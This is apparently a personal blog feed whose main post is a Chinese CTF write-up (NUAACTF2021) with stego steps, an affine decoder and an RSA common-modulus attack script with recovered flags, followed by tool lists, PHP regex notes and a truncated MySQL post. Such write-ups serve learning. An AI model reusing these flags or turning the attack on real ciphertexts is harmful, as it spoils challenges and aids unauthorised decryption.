    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h3><p><strong>baby_mix</strong></p><img src="/2021/12/11/NUAACTF2021/image-20211211183343578.png" class=""><p>用010查看压缩包，发现是假加密，binwalk 分离压缩包，得出图片。</p><img src="/2021/12/11/NUAACTF2021/image-20211212125319781.png" class=""><p>再用StegSolve查看是否有隐写，发现里面有张二维码。</p><img src="/2021/12/11/NUAACTF2021/image-20211212130319382.png" class=""><p>扫描二维码得出一串16进制的字符，再16进制转字符串-&gt;BASE32-&gt;BASE58-&gt;BASE64，最终得出flag。</p><figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs tex">4a5a4a584732544748424658515654514f4634575135435447564a4749564a5347463455595754564f464c444f5752594f56465751334b55474a345841324b494b4a3546495533594b524a4449524b454b35435753334c324f4a41564153534f48424756515243574d355a464d3543474a593d3d3d3d3d3d<br><span class="hljs-params">#1</span>6-&gt;str<br>JZJXG2TGHBFXQVTQOF4WQ5CTGVJGIVJSGF4UYWTVOFLDOWRYOVFWQ3KUGJ4XA2KIKJ5FIU3YKRJDIRKEK5CWS3L2OJAVASSOHBGVQRCWM5ZFM5CGJY======<br><span class="hljs-params">#</span>BASE32解码<br>NSsjf8KxVpqyhtS5RdU21yLZuqV7Z8uKhmT2ypiHRzTSxTR4EDWEimzrAPJN8MXDVgrVtFN<br><span class="hljs-params">#</span>BASE58解码<br>YXN1cml7aV90aGlua190aGF0X2lzX3NvX2Vhc3lfZm9yX3lvdX0=<br><span class="hljs-params">#</span>BASE64解码<br>asuri&#123;i<span class="hljs-built_in">_</span>think<span class="hljs-built_in">_</span>that<span class="hljs-built_in">_</span>is<span class="hljs-built_in">_</span>so<span class="hljs-built_in">_</span>easy<span class="hljs-built_in">_</span>for<span class="hljs-built_in">_</span>you&#125;<br></code></pre></td></tr></table></figure><p><strong>我们生活在南京（一）——穿越时空的电波</strong></p><img src="/2021/12/11/NUAACTF2021/image-20211211183404606.png" class=""><p>猜测音频隐写，用Audacity打开音频，再进行反向，综合题意，到网上搜索无线电通信中英语字母读法对照表，进行比对，得出flag：flag{RADIOWAVESACROSSTIME}</p><img src="/2021/12/11/NUAACTF2021/image-20211212132706058.png" class=""><p><strong>我们生活在南京（一）——等幅电报</strong></p><img src="/2021/12/11/NUAACTF2021/image-20211212152412424.png" class=""><p>更多操作根据提示，发现程序中被插入了高频正弦波，可以算出来频率是 1000Hz，添加一个相位相反的新正弦波抵消即可。解出flag为：</p><p><strong>medium</strong></p><img src="/2021/12/11/NUAACTF2021/image-20211212140901221.png" class=""><p>用Audacity打开音频文件，查看频谱图，得出AES的key:MudaMudaMudaMuda</p><img src="/2021/12/11/NUAACTF2021/image-20211213130705558.png" class=""><p>用010打开图片，发现数据的末尾有串奇怪的编码，利用basecrack进行解密,发现是base64加密。</p><img src="/2021/12/11/NUAACTF2021/image-20211212145726230.png" class=""><p>提取字符串，去除空格，再16-&gt;str，解出一串表情包。</p><img src="/2021/12/11/NUAACTF2021/image-20211212145910699.png" class=""><p>再利用AES表情包解密，得出flag：flag{AES_1s_Gr3atS0_y0u_L1ke_1t_V3ry_Much}</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>checkin</p><img src="/2021/12/11/NUAACTF2021/image-20211211165705121.png" class="" title="image-20211211165705121"><p><strong>仿射密码</strong>是一种替换密码。它是一个字母对一个字母的。</p><p><strong>加密函数</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">e(x)=ax+b(mod m)<br></code></pre></td></tr></table></figure><p>其中 a 和 <em>m</em> 互质，<em>m</em> 是字母的数目。</p><p><strong>解密函数</strong></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">d</span><span class="hljs-params">(x)</span>=<span class="hljs-title">a</span>^<span class="hljs-params">(−<span class="hljs-number">1</span>)</span>*<span class="hljs-params">(x−b)</span><span class="hljs-params">(mod m)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">affline_decode</span>(<span class="hljs-params">cipher_text, a, b, m</span>):</span><br>plain_text = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher_text:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:<br>plain_text += <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))-b)*gmpy2.invert(a,m) % m + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>plain_text += i<br><span class="hljs-built_in">print</span>(plain_text)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    cipher_text=<span class="hljs-string">&#x27;oclz&#123;loovyd_vb_l_bvnucd_hqpumj&#125;&#x27;</span><br>    a=<span class="hljs-number">11</span><br>    b=<span class="hljs-number">11</span><br>    m=<span class="hljs-number">26</span><br>    affline_decode(cipher_text, a, b, m)<br></code></pre></td></tr></table></figure><p>解出flag为：flag{affine_is_a_simple_crypto}</p><p><strong>easyRSA</strong></p><img src="/2021/12/11/NUAACTF2021/image-20211211183252104.png" class=""><p>利用python提取出文件中的c1和c2，再利用共模攻击，解出flag：flag{cry_is_so_hard_but_this_is_so_easy}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c1=<span class="hljs-number">409050138400231971554294088177137255457866075540394361465618420085942037334914972271553348781734546381272987423855027216175678797436131073306888763180501523905135583905144901381224572922542735812959826069495112995911282269377230245515683164143316763758642080370867274365360647518283349684822272605576874844625387807047876206532634507258565110299247417968586498427727688356287596783690957837504438650897148190345700044861267114786057049491164836631033845216983588558199652913012590435836646957168387808248342739079479547784004511726635639407815336376908051269831834833967007931321906512831272657668494512124731674031937509111585885992978363095964860952405173714000880231608814695517820595229454266690556749667796735461828114590568954658520700475934939183919597602772428393159957171678913035977611490511885932486154785287709132255326686398261542844030065556598666191350007752712425713619749771672365637485154754564779267050928584728661807027994863116745339833084769533981399300503220638563466169390183736267153617583845250415885823024980144631079997094009230377992595577328633292390530018606442243369688905175147209020920954422003555782869268678894916106413862664953146515732785804502660407314901808581405034432308726147933849979689989</span><br>c2=<span class="hljs-number">660786051824910230873884600744959030265388429192727951166721113879854464522389325739802703310913732902833778034401632628938144275110259033918655077691853918758634982899427693594671785857857909036915654998761013827868199342737749405352507276436866364180154665315956829382533710951839019853169966694154970158966072113917267296101513243808003273019100867933714599898053661451818477001562112853209154906322205083636027498233807131522283087979547271774312067398759611022191882371123084261761098923994873110788704960182273817371315264655632343946622563006808101322364265578490109714246148052618988958628592753911496921563155003551926547472410642201974274781280633708636309449501619866376422440041537758514811836133804597783256003504933767151921016752120604258580059668650713822253122650687275054081288622996628277268146723350191531420962242602380839728712825405572549099787290957348706683963946075215806340393267714297975946671488782713260980129229158285210722045502442378445134853897763065681974592818004420357542042894544487694477937617156099760573978759048442186633017206146993595028297257148566673402976005517349438948032707348011387517929999285636559431700923275025083662201127580201286747957827301089492530820945594666308738557238429</span><br>n=<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929&#x27;</span>,<span class="hljs-number">16</span>)<br>e1 = <span class="hljs-number">17</span><br>e2 = <span class="hljs-number">65537</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span>(<span class="hljs-params">a, b</span>):</span><br><span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>g, y, x = egcd(b % a, a)<br><span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)<br>s = egcd(e1, e2)<br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = s[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>s1 = - s1<br>c1 = invert(c1, n)<br><span class="hljs-keyword">elif</span> s2&lt;<span class="hljs-number">0</span>:<br>s2 = - s2<br>c2 = invert(c2, n)<br><br>m = <span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n) % n<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p><strong>IDA Start</strong></p><img src="/2021/12/11/NUAACTF2021/image-20211211183445681.png" class=""><p>解压，用wireshark打开，发现flag：flag{St4rt_t0_u3e_IDA}</p><img src="/2021/12/11/NUAACTF2021/image-20211212140222049.png" class="">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>teach</title>
    <link href="/2021/12/02/teach/"/>
    <url>/2021/12/02/teach/</url>
    
    <content type="html"><![CDATA[<h3 id="一、系统的安装"><a href="#一、系统的安装" class="headerlink" title="一、系统的安装"></a>一、系统的安装</h3><p>启动盘：启动盘(Startup Disk)，又称紧急启动盘(Emergency Startup Disk)或安装启动盘。它是写入了操作系统镜像文件的具有特殊功能的移动存储介质(u盘、光盘、移动硬盘以及早期的软盘)，主要用来在操作系统崩溃时进行修复或者重装系统。</p><h4 id="1-重装系统材料准备"><a href="#1-重装系统材料准备" class="headerlink" title="1.重装系统材料准备"></a>1.重装系统材料准备</h4><p>启动盘制作工具，一个U盘，镜像文件</p><h4 id="2-启动盘制作工具"><a href="#2-启动盘制作工具" class="headerlink" title="2.启动盘制作工具"></a>2.启动盘制作工具</h4><p>微软官方制作工具：MediacreationTool</p><p>Etcher</p><p>Rufus</p><p>优启通</p><p>微PE</p><p>大白菜(不推荐，有捆绑软件。)</p><p>老毛桃(不推荐，有捆绑软件。)</p><h4 id="3-镜像下载网站"><a href="#3-镜像下载网站" class="headerlink" title="3.镜像下载网站"></a>3.镜像下载网站</h4><p>微软官方</p><p>MSDN</p><h3 id="二、系统的激活"><a href="#二、系统的激活" class="headerlink" title="二、系统的激活"></a>二、系统的激活</h3><h3 id="三、常用的软件工具"><a href="#三、常用的软件工具" class="headerlink" title="三、常用的软件工具"></a>三、常用的软件工具</h3><p>知识点</p><figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs tex">线程<br>bt种子<br>像素<br>分辨率<br>文件夹与文件的区别<br></code></pre></td></tr></table></figure><h4 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h4><p>ps</p><h4 id="系统激活工具"><a href="#系统激活工具" class="headerlink" title="系统激活工具"></a>系统激活工具</h4><h4 id="下载-工具"><a href="#下载-工具" class="headerlink" title="下载 工具"></a>下载 工具</h4><p>idm(多线程，最高32线程。)</p><p>KinhDown（百度云下载工具）</p><p>Motrix</p><p>Xdown</p><p>aria2</p><p>magnetW</p><p>迅雷</p><p>uTorrent</p><p>qBito</p><h4 id="压缩工具"><a href="#压缩工具" class="headerlink" title="压缩工具"></a>压缩工具</h4><p>bandzip</p><p>7zip</p><p>360压缩</p><h4 id="杀毒工具"><a href="#杀毒工具" class="headerlink" title="杀毒工具"></a>杀毒工具</h4><p>360杀毒</p><p>火绒</p><p>腾讯电脑管家</p><h4 id="录屏工具"><a href="#录屏工具" class="headerlink" title="录屏工具"></a>录屏工具</h4><p>Apowersoft录屏王</p><p>OBS录屏</p><h3 id="这里仅介绍一些常用工具的使用"><a href="#这里仅介绍一些常用工具的使用" class="headerlink" title="这里仅介绍一些常用工具的使用"></a>这里仅介绍一些常用工具的使用</h3><h4 id="1-下载工具"><a href="#1-下载工具" class="headerlink" title="1. 下载工具"></a>1. 下载工具</h4><p>IDM</p><p>迅雷</p><h4 id="2-压缩工具"><a href="#2-压缩工具" class="headerlink" title="2.压缩工具"></a>2.压缩工具</h4><p>bandzip</p><p>7zip</p><h4 id="3-学习视频下载工具"><a href="#3-学习视频下载工具" class="headerlink" title="3.学习视频下载工具"></a>3.学习视频下载工具</h4><p><strong>mooc慕课</strong>：</p><p>MoocDownloader.v1.3.1.1</p><p><strong>b站：</strong></p><p>BBDown v1.4.6</p><p>DownKyi-1.4.0  </p><p>you-get</p><h4 id="油猴工具"><a href="#油猴工具" class="headerlink" title="油猴工具"></a>油猴工具</h4><h3 id="四-常见的一些问题"><a href="#四-常见的一些问题" class="headerlink" title="四.常见的一些问题"></a>四.常见的一些问题</h3><h4 id="蓝屏修复"><a href="#蓝屏修复" class="headerlink" title="蓝屏修复"></a>蓝屏修复</h4><img src="/2021/12/02/teach/image-20211215162627607.png" class="" title="image-20211215162627607"><h4 id="脚本工具-油猴，刷课用"><a href="#脚本工具-油猴，刷课用" class="headerlink" title="#脚本工具(油猴，刷课用)"></a>#脚本工具(油猴，刷课用)</h4><img src="/2021/12/02/teach/image-20211202151751412.png" class=""><h3 id="桌面的优化"><a href="#桌面的优化" class="headerlink" title="桌面的优化"></a>桌面的优化</h3><p>网站博客</p><p><a href="https://www.nite07.com/">https://www.nite07.com/</a></p><p><a href="https://www.muruoxi.com/">https://www.muruoxi.com/</a></p><p>#图吧工具箱</p>]]></content>
    
    
    
    <tags>
      
      <tag>teach</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php学习记录</title>
    <link href="/2021/12/01/phpstudy/"/>
    <url>/2021/12/01/phpstudy/</url>
    
    <content type="html"><![CDATA[<h3 id="第六章-字符串处理"><a href="#第六章-字符串处理" class="headerlink" title="第六章 字符串处理"></a>第六章 字符串处理</h3><h4 id="一、去除空白或其他字符函数"><a href="#一、去除空白或其他字符函数" class="headerlink" title="一、去除空白或其他字符函数"></a>一、去除空白或其他字符函数</h4><p>1.trim()</p><p>2.ltrim()</p><p>3.rtrim()</p><h4 id="二、大小写转换函数"><a href="#二、大小写转换函数" class="headerlink" title="二、大小写转换函数"></a>二、大小写转换函数</h4><p>1.strtoupper()</p><p>2.strtolower()</p><h4 id="三、字符串查找函数"><a href="#三、字符串查找函数" class="headerlink" title="三、字符串查找函数"></a>三、字符串查找函数</h4><p>1.substr_count()</p><p>2.strpos()</p><p>3.strstr()</p><h4 id="四、字符串替换函数"><a href="#四、字符串替换函数" class="headerlink" title="四、字符串替换函数"></a>四、字符串替换函数</h4><p>1.str_replace()</p><h4 id="五、与html标签相关的函数"><a href="#五、与html标签相关的函数" class="headerlink" title="五、与html标签相关的函数"></a>五、与html标签相关的函数</h4><p>1.htmlspeacialchars()</p><p>2.strip_tags()</p><h4 id="六、字符串截取函数"><a href="#六、字符串截取函数" class="headerlink" title="六、字符串截取函数"></a>六、字符串截取函数</h4><p>1.substr()</p><h4 id="七、字符串分隔函数"><a href="#七、字符串分隔函数" class="headerlink" title="七、字符串分隔函数"></a>七、字符串分隔函数</h4><p>1.explode()</p><p>2.str_split()</p><h3 id="第七章-正则表达式"><a href="#第七章-正则表达式" class="headerlink" title="第七章 正则表达式"></a>第七章 正则表达式</h3><h4 id="一、正则表达式语法规则"><a href="#一、正则表达式语法规则" class="headerlink" title="一、正则表达式语法规则"></a>一、正则表达式语法规则</h4><p>正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其它的字符串进行匹配、查找、替换及分割操作!</p><p>这类字符串的特征是由一个或多个</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">普通字符（比如a到z）、</span><br><br><span class="hljs-comment">2</span><span class="hljs-string">.</span><span class="hljs-comment">元字符（有特殊功能的字符比如*、</span><span class="hljs-literal">+</span><span class="hljs-comment">、?等)，等组成的一个字符串!</span><br><br><span class="hljs-comment">例如‘/a/&#x27;，a就是普通字符，/是定界符（表示正则表达式的开始或结束)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#preg_match_all()按指定的正则表达式，在给定的字符串中进行搜索，匹配到符合特征的部分取出来。</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/test/&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;abctesttdwndsatest&#x27;</span>;<br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">int 2</span><br><span class="hljs-comment">$arr 返回的是匹配后的数组</span><br><span class="hljs-comment">*/</span> <br></code></pre></td></tr></table></figure><h4 id="二、定界符"><a href="#二、定界符" class="headerlink" title="二、定界符"></a>二、定界符</h4><p>我们一般习惯使用正斜线”/”作为定界的字符</p><p>当然除了字母、数字、和反斜线以外的字符都可以作为定界符，比如 # ! 0 l</p><p>都是可以的!</p><p>定界符放在正则表达式的起始位置，前后一致!</p><h4 id="三、普通字符"><a href="#三、普通字符" class="headerlink" title="三、普通字符"></a>三、普通字符</h4><p>比如: a-z、A-z、0-9、双引号、单引号，它们没有特殊的含义</p><h4 id="四、元字符"><a href="#四、元字符" class="headerlink" title="四、元字符"></a>四、元字符</h4><p>元字符指的是在正则表达式中有特殊合义的字符常用元字符见备注!</p><img src="/2021/12/01/phpstudy/image-20211201223140159.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">元字符：\d</span><br><span class="hljs-comment">代表0-9之中的任意一个数字</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t\dst/&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;abct0sts&#x27;</span>;<br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">元字符：\D</span><br><span class="hljs-comment">代表0-9之外的任意一个字符</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t\Dst/&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;abct0sts&#x27;</span>;<br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">.与*配合</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">.*配合使用默认情况下是贪婪匹配(尽可能的去匹配字符)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t.*t/&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;asbfasabdjklastsdnadfkashbdfasdasfct&#x27;</span>;<br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><br><span class="hljs-comment">//.*后面加上一个?可以解决贪婪匹配的问题，懒惰匹配</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t.*?t/&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;asbfasabdjklastsdnadfkashbdfasdasfct&#x27;</span>;<br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql数据库实训</title>
    <link href="/2021/11/29/mysql-homework/"/>
    <url>/2021/11/29/mysql-homework/</url>
    
    <content type="html"><![CDATA[<h2 id="4-3-数据表操作实训"><a href="#4-3-数据表操作实训" class="headerlink" title="4.3  数据表操作实训"></a>4.3  数据表操作实训</h2><h3 id="一、stuMIS-数据库中数据表的结构参考“3-4-1学生信息管理系统-stuM-IS-结构分析”"><a href="#一、stuMIS-数据库中数据表的结构参考“3-4-1学生信息管理系统-stuM-IS-结构分析”" class="headerlink" title="一、stuMIS 数据库中数据表的结构参考“3.4.1学生信息管理系统(stuM\IS)结构分析”"></a>一、stuMIS 数据库中数据表的结构参考“3.4.1学生信息管理系统(stuM\IS)结构分析”</h3><h3 id="二、向对应的表中插入数据。"><a href="#二、向对应的表中插入数据。" class="headerlink" title="二、向对应的表中插入数据。"></a>二、向对应的表中插入数据。</h3><p><strong>利用以下脚本，将第一题与第二题完善。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span 